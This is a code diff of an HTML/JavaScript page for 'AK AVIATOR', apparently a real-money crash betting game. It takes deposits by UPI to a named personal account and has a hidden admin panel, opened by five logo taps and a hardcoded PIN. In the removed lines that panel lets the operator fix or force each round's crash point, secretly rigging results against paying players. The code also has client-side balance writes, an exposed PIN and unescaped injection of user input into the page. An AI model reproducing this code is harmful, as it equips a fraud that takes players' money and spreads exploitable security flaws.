@@ -1,163 +1,104 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AK AVIATOR | Professional Master Control</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-    <style>
-        :root { --primary: #e91a3d; --green: #28a745; --bg: #0b0b0e; --card: #1c1c1e; }
-        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
-        
-        /* Header & Stage */
-        .header { background: #121212; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--primary); }
-        .logo { font-size: 20px; font-weight: 900; color: var(--primary); cursor: pointer; }
-        .stage { height: 260px; background: radial-gradient(circle, #250101 0%, #000 100%); position: relative; display: flex; align-items: center; justify-content: center; }
-        #mult-display { font-size: 65px; font-weight: 900; z-index: 10; }
-        #plane { position: absolute; bottom: 20px; left: 20px; width: 55px; z-index: 5; transition: 0.1s linear; }
+<div id="depM" class="modal"><div class="modal-content" style="text-align:center;">
+    <h3 style="color:var(--green);">DEPOSIT MONEY</h3>
+    
+    <input type="number" id="dAmount" placeholder="Enter Amount (₹)" style="width:90%; text-align:center;" oninput="updateQR()">
+    
+    <div id="qrContainer" style="margin:15px auto; padding:10px; background:white; width:150px; height:150px; display:none; border-radius:10px;">
+        <img id="qrImg" src="" style="width:100%; height:100%;">
+    </div>
 
-        /* Admin Modal Styling */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 5000; align-items: center; justify-content: center; }
-        .modal-content { background: #151515; width: 92%; max-height: 85vh; padding: 20px; border-radius: 15px; border: 1px solid var(--primary); overflow-y: auto; box-sizing: border-box; }
-        
-        .admin-section { background: #000; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #222; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #444; color: white; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        
-        .btn { width: 100%; padding: 14px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
-        .btn-primary { background: var(--primary); color: white; }
-        .btn-live { background: white; color: black; margin-top: 10px; }
-        
-        .req-box { font-size: 11px; max-height: 150px; overflow-y: auto; }
-        .req-item { background: #1a1a1a; padding: 10px; margin-bottom: 8px; border-radius: 5px; border-left: 3px solid var(--green); }
-    </style>
-</head>
-<body>
-
-<div class="header">
-    <div class="logo" id="adminTrigger">AK AVIATOR</div>
-    <div id="userBal" style="color:var(--green); font-weight:bold;">₹0.00</div>
-</div>
-
-<div class="stage">
-    <div id="mult-display">1.00x</div>
-    <img src="https://img.icons8.com/color/96/fighter-jet.png" id="plane">
-</div>
+    <p style="font-size:13px; margin:10px 0;">UPI ID: <b style="color:var(--gold);">Poonamlondhe52-1@okhdfcbank</b></p>
+    
+    <input type="text" id="utrInput" placeholder="Enter 12-Digit UTR Number" style="width:90%;">
+    
+    <button class="main-btn" style="width:100%; margin-top:15px;" onclick="submitDeposit()">SUBMIT REQUEST</button>
+    <button onclick="closeM('depM')" style="background:none; border:none; color:#777; margin-top:10px;">Cancel</button>
+</div></div>
 
 <div id="adminM" class="modal"><div class="modal-content">
-    <h2 style="color:var(--primary); text-align:center; margin-top:0;">MASTER CONTROL</h2>
+    <h2 style="color:var(--primary); text-align:center;">MASTER CONTROL</h2>
     
-    <div class="admin-section">
-        <p style="margin:0; font-size:12px; color:var(--primary);">RESULT CONTROL</p>
-        <input type="number" id="nextCrash" placeholder="Set Next Multiplier (e.g. 50.00)">
-        <button class="btn btn-primary" onclick="lockResult()">LOCK NEXT ROUND</button>
-        <button class="btn btn-live" onclick="instantCrash()">CRASH NOW (LIVE)</button>
+    <div style="background:#000; padding:10px; border-radius:10px; border:1px solid #333;">
+        <h4 style="color:var(--gold); margin-top:0;">Pending Deposit Requests</h4>
+        <div id="adminDepList" style="font-size:12px; max-height:300px; overflow-y:auto;">
+            Loading requests...
+        </div>
     </div>
 
-    <div class="admin-section">
-        <p style="margin:0; font-size:12px; color:var(--green);">DEPOSIT REQUESTS</p>
-        <div id="depList" class="req-box">Loading...</div>
-    </div>
-
-    <button onclick="document.getElementById('adminM').style.display='none'" class="btn" style="background:#333; color:white;">BACK TO GAME</button>
+    <button class="action-btn" style="width:100%; margin-top:20px; background:#333;" onclick="closeM('adminM')">Close Panel</button>
 </div></div>
 
 <script>
-    const firebaseConfig = { databaseURL: "https://my-colour-game-670af-default-rtdb.firebaseio.com" };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    const MY_UPI = "Poonamlondhe52-1@okhdfcbank";
 
-    let mult = 1.0, isRunning = false, crashAt = 2.0;
-    let uid = "U" + Math.floor(Math.random()*9999);
-
-    // Main Engine Logic
-    function gameEngine() {
-        mult = 1.0; isRunning = true;
-        document.getElementById('mult-display').style.color = "white";
+    // 1. QR Code Logic
+    function updateQR() {
+        let amt = document.getElementById('dAmount').value;
+        let qrBox = document.getElementById('qrContainer');
+        let qrImg = document.getElementById('qrImg');
         
-        // Admin Target Check
-        db.ref('game/control').once('value', s => {
-            crashAt = s.val()?.target || (Math.random()*2 + 1.1);
+        if(amt > 0) {
+            // Generates Google Pay/PhonePe compatible QR
+            let url = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${MY_UPI}%26am=${amt}%26cu=INR`;
+            qrImg.src = url;
+            qrBox.style.display = "block";
+        } else {
+            qrBox.style.display = "none";
+        }
+    }
+
+    // 2. Submit Deposit
+    function submitDeposit() {
+        let amt = document.getElementById('dAmount').value;
+        let utr = document.getElementById('utrInput').value;
+        
+        if(amt < 10 || utr.length < 10) {
+            alert("Please enter valid Amount and UTR!");
+            return;
+        }
+
+        db.ref('admin/deposits').push({
+            uid: uid,
+            amt: amt,
+            utr: utr,
+            status: "pending",
+            time: Date.now()
+        }).then(() => {
+            alert("Request Sent! Wait for Admin approval.");
+            closeM('depM');
         });
-
-        let loop = setInterval(() => {
-            if(!isRunning) { clearInterval(loop); return; }
-            if(mult >= crashAt) {
-                clearInterval(loop);
-                crashLogic();
-            } else {
-                mult += (mult < 5) ? 0.01 : 0.1;
-                document.getElementById('mult-display').innerText = mult.toFixed(2) + "x";
-                animatePlane(mult);
-            }
-        }, 100);
     }
 
-    function crashLogic() {
-        isRunning = false;
-        document.getElementById('mult-display').innerText = "FLEW AWAY!";
-        document.getElementById('mult-display').style.color = "var(--primary)";
-        db.ref('game/control/target').set(null); // Reset target after use
-        setTimeout(() => { 
-            document.getElementById('plane').style.transform = `translate(0,0)`;
-            gameEngine(); 
-        }, 3000);
-    }
+    // 3. Admin Control (Accept/Reject)
+    function loadAdminRequests() {
+        db.ref('admin/deposits').on('value', (snapshot) => {
+            const list = document.getElementById('adminDepList');
+            list.innerHTML = "";
+            if(!snapshot.exists()) { list.innerHTML = "No new requests"; return; }
 
-    function animatePlane(m) {
-        let x = (m-1)*30; let y = (m-1)*15;
-        document.getElementById('plane').style.transform = `translate(${Math.min(x, 280)}px, -${Math.min(y, 180)}px)`;
-    }
-
-    // Admin Operations
-    function lockResult() {
-        let val = parseFloat(document.getElementById('nextCrash').value);
-        if(val >= 1) {
-            db.ref('game/control/target').set(val);
-            alert("Success: Next crash set to " + val + "x");
-        }
-    }
-
-    function instantCrash() {
-        crashAt = mult; // Force loop to stop at current value
-        db.ref('game/control/target').set(mult);
-        alert("CRASHED LIVE!");
-    }
-
-    // Secret Entry (5 Taps)
-    let taps = 0;
-    document.getElementById('adminTrigger').onclick = () => {
-        taps++;
-        if(taps === 5) {
-            if(prompt("Admin Pin:") === "77759636477") {
-                document.getElementById('adminM').style.display='flex';
-                loadRequests();
-            }
-            taps = 0;
-        }
-    };
-
-    function loadRequests() {
-        db.ref('admin/deposits').on('value', s => {
-            let h = "";
-            s.forEach(c => {
-                let d = c.val();
-                h += `<div class="req-item">
-                    UID: ${d.uid} | ₹${d.amt} | UTR: ${d.utr}
-                    <button onclick="approve('${c.key}','${d.uid}',${d.amt})" style="color:var(--green); background:none; border:none; float:right; font-weight:bold;">APPROVE</button>
+            snapshot.forEach((child) => {
+                let data = child.val();
+                list.innerHTML += `
+                <div style="border-bottom:1px solid #222; padding:10px 0;">
+                    <b>Amt:</b> ₹${data.amt} | <b>UTR:</b> ${data.utr} <br>
+                    <button onclick="handleReq('${child.key}', '${data.uid}', ${data.amt}, 'accept')" style="color:lime; background:none; border:1px solid lime; padding:2px 5px; margin-top:5px; cursor:pointer;">ACCEPT</button>
+                    <button onclick="handleReq('${child.key}', null, null, 'reject')" style="color:red; background:none; border:1px solid red; padding:2px 5px; margin-left:10px; cursor:pointer;">REJECT</button>
                 </div>`;
             });
-            document.getElementById('depList').innerHTML = h || "No requests found";
         });
     }
 
-    function approve(key, user, amt) {
-        db.ref('users/'+user+'/balance').transaction(c => (c||0)+parseFloat(amt));
+    function handleReq(key, user, amount, action) {
+        if(action === 'accept') {
+            db.ref('users/'+user+'/balance').transaction((curr) => (curr || 0) + parseFloat(amount));
+            alert("Deposit Accepted! Balance Added.");
+        } else {
+            alert("Request Rejected.");
+        }
         db.ref('admin/deposits/'+key).remove();
-        alert("Money added to user wallet!");
     }
 
-    gameEngine();
+    // Trigger Admin Data when panel opens
+    // (Inside your existing admin login logic)
+    // loadAdminRequests();
 </script>
-</body>
-</html>
